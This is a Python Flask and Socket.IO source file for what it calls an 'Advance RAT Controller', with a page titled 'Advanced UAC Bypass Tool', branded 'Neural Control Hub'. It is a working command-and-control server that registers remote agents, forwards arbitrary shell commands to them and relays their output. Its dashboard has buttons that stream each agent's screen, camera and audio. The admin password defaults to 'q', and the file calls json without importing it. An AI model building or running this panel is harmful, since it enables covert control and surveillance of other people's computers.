# MERGED CONTROLLER WITH FRONTEND UI
# This file combines the controller.py backend with the frontend UI

from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, session, flash, render_template_string, render_template
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
from collections import defaultdict
import datetime
import time
import os
import base64
import queue
import hashlib
import hmac
import secrets
import threading
import smtplib
from email.mime.text import MIMEText

# WebRTC imports for SFU functionality
try:
    import asyncio
    import aiortc
    from aiortc import RTCPeerConnection, RTCSessionDescription, MediaStreamTrack
    from aiortc.contrib.media import MediaPlayer, MediaRecorder
    from aiortc.mediastreams import MediaStreamError
    WEBRTC_AVAILABLE = True
    print("WebRTC (aiortc) support enabled")
except ImportError:
    WEBRTC_AVAILABLE = False
    print("WebRTC (aiortc) not available - falling back to Socket.IO streaming")

# Configuration Management
class Config:
    """Configuration class for Advance RAT Controller"""
    
    # Admin Authentication
    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'q')
    
    # Flask Configuration
    SECRET_KEY = os.environ.get('SECRET_KEY', None)
    
    # Server Configuration
    HOST = os.environ.get('HOST', '0.0.0.0')
    PORT = int(os.environ.get('PORT', 8080))
    
    # Security Settings
    SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 3600))  # 1 hour in seconds
    MAX_LOGIN_ATTEMPTS = int(os.environ.get('MAX_LOGIN_ATTEMPTS', 5))
    LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 300))  # 5 minutes lockout
    
    # Password Security Settings
    SALT_LENGTH = 32  # Length of salt in bytes
    HASH_ITERATIONS = 100000  # Number of iterations for PBKDF2

# Initialize Flask app with configuration
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)

# Configure CORS for frontend-backend communication
allowed_origins = [
    "http://localhost:3000", 
    "http://localhost:5173", 
    "http://127.0.0.1:3000", 
    "http://127.0.0.1:5173",
    "https://neural-control-hub-frontend.onrender.com",
    "https://*.onrender.com"
]

CORS(app, origins=allowed_origins, 
     supports_credentials=True, allow_headers=["Content-Type", "Authorization", "X-Requested-With"])

# Use threading for Socket.IO
socketio = SocketIO(app, async_mode='threading', cors_allowed_origins=allowed_origins)

# Settings persistence
SETTINGS_FILE_PATH = os.environ.get('SETTINGS_FILE_PATH', os.path.join(os.path.dirname(__file__), 'settings.json'))

DEFAULT_SETTINGS = {
    'server': {
        'controllerUrl': f"http://{Config.HOST}:{Config.PORT}",
        'serverPort': Config.PORT,
        'sslEnabled': False,
        'maxAgents': 100,
        'heartbeatInterval': 30,
        'commandTimeout': 30,
        'maxConcurrentStreams': 10,
        'streamQuality': 'auto',
        'enableWebRTC': True,
        'enableFileTransfer': True,
        'enableRemoteControl': True,
        'enableProcessManager': True,
        'enableSystemMonitor': True,
        'enableVoiceControl': True,
        'enableKeyboardShortcuts': True,
        'enableNotificationCenter': True,
        'enableActivityFeed': True,
        'enableSearchAndFilter': True,
        'enableQuickActions': True,
        'enableSettings': True,
        'enableAbout': True
    },
    'security': {
        'requireAuthentication': True,
        'sessionTimeout': Config.SESSION_TIMEOUT,
        'maxLoginAttempts': Config.MAX_LOGIN_ATTEMPTS,
        'loginTimeout': Config.LOGIN_TIMEOUT,
        'enableRateLimiting': False,
        'allowedIPs': [],
        'blockedIPs': [],
        'frontendOrigins': allowed_origins
    },
    'notifications': {
        'enableEmailNotifications': False,
        'smtpServer': '',
        'smtpPort': 587,
        'smtpUsername': '',
        'smtpPassword': '',
        'emailRecipients': [],
        'notificationTypes': {
            'agentConnect': True,
            'agentDisconnect': True,
            'commandExecution': False,
            'fileTransfer': False,
            'systemAlerts': True
        }
    },
    'ui': {
        'theme': 'dark',
        'language': 'en',
        'timezone': 'UTC',
        'dateFormat': 'YYYY-MM-DD',
        'timeFormat': '24h',
        'autoRefresh': True,
        'refreshInterval': 5,
        'showSystemInfo': True,
        'showPerformanceMetrics': True,
        'enableAnimations': True,
        'compactMode': False
    }
}

def load_settings():
    """Load settings from JSON file"""
    try:
        if os.path.exists(SETTINGS_FILE_PATH):
            with open(SETTINGS_FILE_PATH, 'r') as f:
                return json.load(f)
    except Exception as e:
        print(f"Error loading settings: {e}")
    return DEFAULT_SETTINGS.copy()

def save_settings(settings):
    """Save settings to JSON file"""
    try:
        with open(SETTINGS_FILE_PATH, 'w') as f:
            json.dump(settings, f, indent=2)
        return True
    except Exception as e:
        print(f"Error saving settings: {e}")
        return False

# Load settings
settings = load_settings()

# Authentication system
login_attempts = defaultdict(list)
locked_ips = {}

def create_secure_password_hash(password):
    """Create a secure password hash using PBKDF2"""
    salt = secrets.token_bytes(Config.SALT_LENGTH)
    password_hash = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, Config.HASH_ITERATIONS)
    return password_hash.hex(), salt.hex()

def verify_password(password, stored_hash, salt):
    """Verify a password against stored hash"""
    try:
        salt_bytes = bytes.fromhex(salt)
        stored_hash_bytes = bytes.fromhex(stored_hash)
        password_hash = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt_bytes, Config.HASH_ITERATIONS)
        return hmac.compare_digest(password_hash, stored_hash_bytes)
    except Exception:
        return False

# Create admin password hash
ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT = create_secure_password_hash(Config.ADMIN_PASSWORD)

# In-memory storage for agent data
AGENTS_DATA = defaultdict(lambda: {"sid": None, "last_seen": None})
DOWNLOAD_BUFFERS = defaultdict(lambda: {"chunks": [], "total_size": 0, "local_path": None})

# WebRTC data structures
WEBRTC_PEER_CONNECTIONS = {}
WEBRTC_STREAMS = {}
WEBRTC_VIEWERS = {}

# Streaming data
SCREEN_FRAMES_H264 = {}
CAMERA_FRAMES_H264 = {}
AUDIO_FRAMES_OPUS = {}

# Authentication decorator
def require_auth(f):
    def decorated(*args, **kwargs):
        if not session.get('authenticated'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

# Frontend HTML Template (Embedded)
FRONTEND_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Advanced UAC Bypass Tool (Community)</title>
    <style>
        /* Embedded CSS from frontend */
        *{box-sizing:border-box;margin:0;padding:0}body{font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;background:#0a0a0a;color:#e5e5e5;line-height:1.6}*{box-sizing:border-box;margin:0;padding:0}body{font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;background:#0a0a0a;color:#e5e5e5;line-height:1.6}.container{max-width:1400px;margin:0 auto;padding:0 1rem}.header{background:linear-gradient(135deg,#1a1a1a 0%,#2d2d2d 100%);border-bottom:1px solid #333;padding:1rem 0}.header-content{display:flex;justify-content:space-between;align-items:center}.logo{font-size:1.5rem;font-weight:700;color:#00ff88;text-decoration:none}.nav{display:flex;gap:2rem}.nav a{color:#e5e5e5;text-decoration:none;transition:color 0.3s}.nav a:hover{color:#00ff88}.main-content{display:grid;grid-template-columns:250px 1fr;gap:2rem;padding:2rem 0}.sidebar{background:#1a1a1a;border-radius:8px;padding:1.5rem}.sidebar h3{color:#00ff88;margin-bottom:1rem}.sidebar ul{list-style:none}.sidebar li{margin-bottom:0.5rem}.sidebar a{color:#e5e5e5;text-decoration:none;display:block;padding:0.5rem;border-radius:4px;transition:background 0.3s}.sidebar a:hover{background:#333}.dashboard{background:#1a1a1a;border-radius:8px;padding:2rem}.dashboard h2{color:#00ff88;margin-bottom:2rem}.agents-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1.5rem}.agent-card{background:#2d2d2d;border:1px solid #333;border-radius:8px;padding:1.5rem;transition:transform 0.3s,border-color 0.3s}.agent-card:hover{transform:translateY(-2px);border-color:#00ff88}.agent-card.online{border-color:#00ff88}.agent-card.offline{border-color:#666}.agent-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem}.agent-name{font-size:1.2rem;font-weight:600;color:#e5e5e5}.agent-status{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:0.5rem}.agent-status.online{background:#00ff88}.agent-status.offline{background:#666}.agent-info{color:#999;font-size:0.9rem;margin-bottom:1rem}.agent-actions{display:flex;gap:0.5rem}.btn{background:#00ff88;color:#000;border:none;padding:0.5rem 1rem;border-radius:4px;cursor:pointer;font-weight:600;transition:background 0.3s}.btn:hover{background:#00cc6a}.btn-secondary{background:#333;color:#e5e5e5}.btn-secondary:hover{background:#444}.btn-danger{background:#ff4444;color:#fff}.btn-danger:hover{background:#cc3333}.status-bar{background:#1a1a1a;border-top:1px solid #333;padding:1rem 0;margin-top:2rem}.status-content{display:flex;justify-content:space-between;align-items:center}.connection-status{display:flex;align-items:center;gap:0.5rem}.connection-indicator{width:8px;height:8px;border-radius:50%;background:#00ff88}.connection-indicator.disconnected{background:#ff4444}.loading{display:inline-block;width:20px;height:20px;border:2px solid #333;border-top:2px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.hidden{display:none}.error{color:#ff4444}.success{color:#00ff88}.warning{color:#ffaa00}.info{color:#00aaff}
    </style>
</head>
<body>
    <div id="root">
        <div class="container">
            <header class="header">
                <div class="header-content">
                    <a href="/" class="logo">Neural Control Hub</a>
                    <nav class="nav">
                        <a href="/">Dashboard</a>
                        <a href="/agents">Agents</a>
                        <a href="/settings">Settings</a>
                        <a href="/about">About</a>
                    </nav>
                </div>
            </header>
            
            <main class="main-content">
                <aside class="sidebar">
                    <h3>Navigation</h3>
                    <ul>
                        <li><a href="/" class="nav-link active">Dashboard</a></li>
                        <li><a href="/agents" class="nav-link">Agents</a></li>
                        <li><a href="/streams" class="nav-link">Streams</a></li>
                        <li><a href="/files" class="nav-link">File Manager</a></li>
                        <li><a href="/processes" class="nav-link">Process Manager</a></li>
                        <li><a href="/monitor" class="nav-link">System Monitor</a></li>
                        <li><a href="/settings" class="nav-link">Settings</a></li>
                    </ul>
                </aside>
                
                <section class="dashboard">
                    <h2>Agent Dashboard</h2>
                    <div id="agents-container">
                        <div class="loading" id="loading">Loading agents...</div>
                        <div class="agents-grid" id="agents-grid" style="display: none;"></div>
                        <div class="error" id="error-message" style="display: none;">Failed to load agents</div>
                    </div>
                </section>
            </main>
            
            <footer class="status-bar">
                <div class="status-content">
                    <div class="connection-status">
                        <div class="connection-indicator" id="connection-status"></div>
                        <span id="connection-text">Connecting...</span>
                    </div>
                    <div id="agent-count">0 agents connected</div>
                </div>
            </footer>
        </div>
    </div>

    <script>
        // Embedded JavaScript from frontend
        class AgentDashboard {
            constructor() {
                this.socket = null;
                this.agents = new Map();
                this.init();
            }

            init() {
                this.connectSocket();
                this.setupEventListeners();
            }

            connectSocket() {
                // Connect to the same server (no need for separate backend URL)
                this.socket = io({
                    transports: ['websocket', 'polling'],
                    timeout: 20000,
                });

                this.socket.on('connect', () => {
                    console.log('Connected to Neural Control Hub');
                    this.updateConnectionStatus(true);
                    this.socket.emit('operator_connect');
                });

                this.socket.on('disconnect', () => {
                    console.log('Disconnected from Neural Control Hub');
                    this.updateConnectionStatus(false);
                });

                this.socket.on('agent_list_update', (agentData) => {
                    this.updateAgents(agentData);
                });

                this.socket.on('connect_error', (error) => {
                    console.error('Connection error:', error);
                    this.updateConnectionStatus(false);
                });
            }

            setupEventListeners() {
                // Add any additional event listeners here
            }

            updateConnectionStatus(connected) {
                const indicator = document.getElementById('connection-status');
                const text = document.getElementById('connection-text');
                
                if (connected) {
                    indicator.classList.remove('disconnected');
                    text.textContent = 'Connected';
                } else {
                    indicator.classList.add('disconnected');
                    text.textContent = 'Disconnected';
                }
            }

            updateAgents(agentData) {
                const agentsGrid = document.getElementById('agents-grid');
                const loading = document.getElementById('loading');
                const errorMessage = document.getElementById('error-message');
                const agentCount = document.getElementById('agent-count');

                // Hide loading and error messages
                loading.style.display = 'none';
                errorMessage.style.display = 'none';

                // Clear existing agents
                agentsGrid.innerHTML = '';

                // Update agent count
                const agentCountValue = Object.keys(agentData).length;
                agentCount.textContent = `${agentCountValue} agent${agentCountValue !== 1 ? 's' : ''} connected`;

                // Add agents to grid
                Object.entries(agentData).forEach(([agentId, data]) => {
                    const agentCard = this.createAgentCard(agentId, data);
                    agentsGrid.appendChild(agentCard);
                });

                // Show agents grid
                agentsGrid.style.display = 'grid';
            }

            createAgentCard(agentId, data) {
                const card = document.createElement('div');
                card.className = `agent-card ${data.sid ? 'online' : 'offline'}`;
                
                const isOnline = data.sid !== null;
                const lastSeen = data.last_seen ? new Date(data.last_seen) : new Date();
                const timeAgo = this.getTimeAgo(lastSeen);

                card.innerHTML = `
                    <div class="agent-header">
                        <div class="agent-name">
                            <span class="agent-status ${isOnline ? 'online' : 'offline'}"></span>
                            ${data.name || `Agent-${agentId.slice(0, 8)}`}
                        </div>
                    </div>
                    <div class="agent-info">
                        <div>Platform: ${data.platform || 'Unknown'}</div>
                        <div>IP: ${data.ip || '127.0.0.1'}</div>
                        <div>Last seen: ${timeAgo}</div>
                        <div>Capabilities: ${(data.capabilities || []).join(', ')}</div>
                    </div>
                    <div class="agent-actions">
                        <button class="btn" onclick="dashboard.sendCommand('${agentId}', 'whoami')">Execute Command</button>
                        <button class="btn btn-secondary" onclick="dashboard.startStream('${agentId}', 'screen')">Screen</button>
                        <button class="btn btn-secondary" onclick="dashboard.startStream('${agentId}', 'camera')">Camera</button>
                        <button class="btn btn-secondary" onclick="dashboard.startStream('${agentId}', 'audio')">Audio</button>
                    </div>
                `;

                return card;
            }

            getTimeAgo(date) {
                const now = new Date();
                const diff = now - date;
                const seconds = Math.floor(diff / 1000);
                const minutes = Math.floor(seconds / 60);
                const hours = Math.floor(minutes / 60);
                const days = Math.floor(hours / 24);

                if (days > 0) return `${days} day${days !== 1 ? 's' : ''} ago`;
                if (hours > 0) return `${hours} hour${hours !== 1 ? 's' : ''} ago`;
                if (minutes > 0) return `${minutes} minute${minutes !== 1 ? 's' : ''} ago`;
                return 'Just now';
            }

            sendCommand(agentId, command) {
                if (this.socket && this.socket.connected) {
                    this.socket.emit('execute_command', { agent_id: agentId, command });
                    console.log(`Sent command to ${agentId}: ${command}`);
                }
            }

            startStream(agentId, type) {
                if (this.socket && this.socket.connected) {
                    this.socket.emit('execute_command', { agent_id: agentId, command: `start-${type}` });
                    console.log(`Started ${type} stream for ${agentId}`);
                }
            }
        }

        // Initialize dashboard when page loads
        let dashboard;
        document.addEventListener('DOMContentLoaded', () => {
            dashboard = new AgentDashboard();
        });
    </script>
    
    <!-- Socket.IO Client -->
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
</body>
</html>
"""

# Routes
@app.route('/')
@require_auth
def index():
    """Serve the main dashboard"""
    return FRONTEND_HTML

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page"""
    if request.method == 'POST':
        password = request.form.get('password')
        client_ip = request.remote_addr
        
        # Check if IP is locked
        if client_ip in locked_ips:
            if time.time() < locked_ips[client_ip]:
                remaining = int(locked_ips[client_ip] - time.time())
                flash(f'IP locked for {remaining} seconds', 'error')
                return render_template_string(LOGIN_TEMPLATE)
            else:
                del locked_ips[client_ip]
        
        # Check login attempts
        now = time.time()
        login_attempts[client_ip] = [attempt for attempt in login_attempts[client_ip] if now - attempt < Config.LOGIN_TIMEOUT]
        
        if len(login_attempts[client_ip]) >= Config.MAX_LOGIN_ATTEMPTS:
            locked_ips[client_ip] = now + Config.LOGIN_TIMEOUT
            flash('Too many login attempts. IP locked.', 'error')
            return render_template_string(LOGIN_TEMPLATE)
        
        if verify_password(password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
            session['authenticated'] = True
            session['login_time'] = now
            login_attempts[client_ip] = []  # Clear attempts on successful login
            return redirect(url_for('index'))
        else:
            login_attempts[client_ip].append(now)
            flash('Invalid password', 'error')
    
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    """Logout and clear session"""
    session.clear()
    return redirect(url_for('login'))

# Login template
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Login - Neural Control Hub</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0a0a0a; color: #e5e5e5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: #1a1a1a; padding: 2rem; border-radius: 8px; border: 1px solid #333; width: 300px; }
        .login-container h2 { color: #00ff88; margin-bottom: 1rem; text-align: center; }
        .form-group { margin-bottom: 1rem; }
        .form-group label { display: block; margin-bottom: 0.5rem; }
        .form-group input { width: 100%; padding: 0.5rem; border: 1px solid #333; border-radius: 4px; background: #2d2d2d; color: #e5e5e5; }
        .btn { width: 100%; padding: 0.75rem; background: #00ff88; color: #000; border: none; border-radius: 4px; cursor: pointer; font-weight: 600; }
        .btn:hover { background: #00cc6a; }
        .flash { padding: 0.5rem; margin-bottom: 1rem; border-radius: 4px; }
        .flash.error { background: #ff4444; color: #fff; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Neural Control Hub</h2>
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                {% for category, message in messages %}
                    <div class="flash {{ category }}">{{ message }}</div>
                {% endfor %}
            {% endif %}
        {% endwith %}
        <form method="POST">
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Login</button>
        </form>
    </div>
</body>
</html>
"""

# Socket.IO Event Handlers
@socketio.on('connect')
def handle_connect():
    print(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    # Find which agent disconnected and remove it
    disconnected_agent_id = None
    disconnected_agent_name = None
    
    for agent_id, data in AGENTS_DATA.items():
        if data["sid"] == request.sid:
            disconnected_agent_id = agent_id
            disconnected_agent_name = data.get("name", f"Agent-{agent_id}")
            break
    
    if disconnected_agent_id:
        del AGENTS_DATA[disconnected_agent_id]
        emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
        print(f"Agent {disconnected_agent_id} disconnected.")
    else:
        print(f"Operator client disconnected: {request.sid}")

@socketio.on('operator_connect')
def handle_operator_connect():
    """When a web dashboard connects."""
    join_room('operators')
    emit('agent_list_update', AGENTS_DATA)  # Send current agent list to the new operator
    print("Operator dashboard connected.")

@socketio.on('agent_connect')
def handle_agent_connect(data):
    """When an agent connects and registers itself."""
    agent_id = data.get('agent_id')
    if not agent_id:
        return
    
    # Store agent information
    AGENTS_DATA[agent_id]["sid"] = request.sid
    AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
    AGENTS_DATA[agent_id]["name"] = data.get('name', f'Agent-{agent_id}')
    AGENTS_DATA[agent_id]["platform"] = data.get('platform', 'Unknown')
    AGENTS_DATA[agent_id]["ip"] = data.get('ip', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
    AGENTS_DATA[agent_id]["capabilities"] = data.get('capabilities', ['screen', 'files', 'commands'])
    AGENTS_DATA[agent_id]["cpu_usage"] = data.get('cpu_usage', 0)
    AGENTS_DATA[agent_id]["memory_usage"] = data.get('memory_usage', 0)
    AGENTS_DATA[agent_id]["network_usage"] = data.get('network_usage', 0)
    AGENTS_DATA[agent_id]["system_info"] = data.get('system_info', {})
    AGENTS_DATA[agent_id]["uptime"] = data.get('uptime', 0)
    
    # Notify all operators of the new agent
    emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
    
    print(f"Agent {agent_id} connected and registered.")

@socketio.on('agent_heartbeat')
def handle_agent_heartbeat(data):
    agent_id = data.get('agent_id')
    if agent_id in AGENTS_DATA:
        AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'

@socketio.on('execute_command')
def handle_execute_command(data):
    """Execute a command on an agent"""
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    if agent_id not in AGENTS_DATA:
        emit('status_update', {'message': f'Agent {agent_id} not found.', 'type': 'error'}, room=request.sid)
        return
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        emit('status_update', {'message': f'Agent {agent_id} not connected.', 'type': 'error'}, room=request.sid)
        return
    
    # Forward command to agent
    emit('execute_command', {'command': command}, room=agent_sid)
    print(f"Command '{command}' sent to agent {agent_id}")

@socketio.on('command_output')
def handle_command_output(data):
    """Agent sends back the result of a command"""
    agent_id = data.get('agent_id')
    output = data.get('output')
    
    # Forward the output to all operator dashboards
    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
    print(f"Received output from {agent_id}: {output[:100]}...")

# API Routes
@app.route('/api/agents', methods=['GET'])
@require_auth
def get_agents():
    """Get list of all agents with their status and performance metrics"""
    agents = []
    for agent_id, data in AGENTS_DATA.items():
        agent_info = {
            'id': agent_id,
            'name': data.get('name', f'Agent-{agent_id}'),
            'status': 'online' if data.get('sid') else 'offline',
            'platform': data.get('platform', 'Unknown'),
            'ip': data.get('ip', '127.0.0.1'),
            'last_seen': data.get('last_seen'),
            'capabilities': data.get('capabilities', []),
            'performance': {
                'cpu': data.get('cpu_usage', 0),
                'memory': data.get('memory_usage', 0),
                'network': data.get('network_usage', 0)
            }
        }
        agents.append(agent_info)
    
    return jsonify(agents)

@app.route('/api/agents/<agent_id>', methods=['GET'])
@require_auth
def get_agent_details(agent_id):
    """Get detailed information about a specific agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    data = AGENTS_DATA[agent_id]
    agent_info = {
        'id': agent_id,
        'name': data.get('name', f'Agent-{agent_id}'),
        'status': 'online' if data.get('sid') else 'offline',
        'platform': data.get('platform', 'Unknown'),
        'ip': data.get('ip', '127.0.0.1'),
        'last_seen': data.get('last_seen'),
        'capabilities': data.get('capabilities', []),
        'performance': {
            'cpu': data.get('cpu_usage', 0),
            'memory': data.get('memory_usage', 0),
            'network': data.get('network_usage', 0)
        },
        'system_info': data.get('system_info', {}),
        'uptime': data.get('uptime', 0)
    }
    
    return jsonify(agent_info)

# Health check endpoint
@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.datetime.utcnow().isoformat(),
        'agents_connected': len([a for a in AGENTS_DATA.values() if a.get('sid')]),
        'total_agents': len(AGENTS_DATA)
    })

# Main execution
if __name__ == '__main__':
    print("Starting Neural Control Hub with embedded frontend...")
    print(f"Backend URL: http://{Config.HOST}:{Config.PORT}")
    print(f"Frontend URL: http://{Config.HOST}:{Config.PORT}")
    print("=" * 60)
    
    # Start the server
    socketio.run(app, host=Config.HOST, port=Config.PORT, debug=False)